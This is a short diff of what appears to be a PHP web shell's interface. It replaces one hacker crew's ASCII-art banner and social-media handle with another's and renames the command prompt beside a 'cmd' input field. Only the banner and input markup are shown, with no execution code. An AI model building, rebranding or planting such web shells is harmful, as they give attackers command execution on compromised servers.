@@ -312,21 +312,22 @@ if (isset($_GET["feature"])) {
  ___) |_____|  _  | |___| |___| |__| |___|  _ <| |___  \ V  V /_____\__ \ <span></span>
 |____/      |_| |_|_____|_____|_____\____|_| \_\_____|  \_/\_/      (   / <span></span>
                                                                      |_|  <span></span>
-                                                                          <span></span>													      
-                       _   _   _   _   _   _                               <span></span>	
-                      / \ / \ / \ / \ / \ / \                              <span></span>	
-                     ( M | E | R | G | E | N |                              <span></span>	
-                      \_/ \_/ \_/ \_/ \_/ \_/                              <span></span>	
-                                                                           <span></span>
-                                                                           <span></span>
-                           FB.ME/Kergiday                                  <span></span>
-								                                           <span></span>
-            (Mergen - Weewx - TinSimth and AllHell Crew Members )          <span></span>
-                                                                           <span></span>									 
+                                                                          <span></span> 
+                       _   _   _   _   _   _   _                          <span></span>         	
+                      / \ / \ / \ / \ / \ / \ / \                         <span></span>           	
+                     ( P | r | 0 | p | h | 3 | t )                        <span></span>            	
+                      \_/ \_/ \_/ \_/ \_/ \_/ \_/                         <span></span>
+                                                                          <span></span>
+                                                                          <span></span>
+                           fb.me/pr0ph3ttr                                <span></span>
+                                                                          <span></span>
+								          <span></span>
+             (My Friends : BORU70 - iComsium - Sixx0r - SahinGoz)         <span></span>
+                                                                          <span></span>									 
                 </div>
             </pre>
             <div id="shell-input">
-                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">S-Hellcrew-$</label>
+                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">pr0ph3t-$</label>
                 <div>
                     <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                 </div>
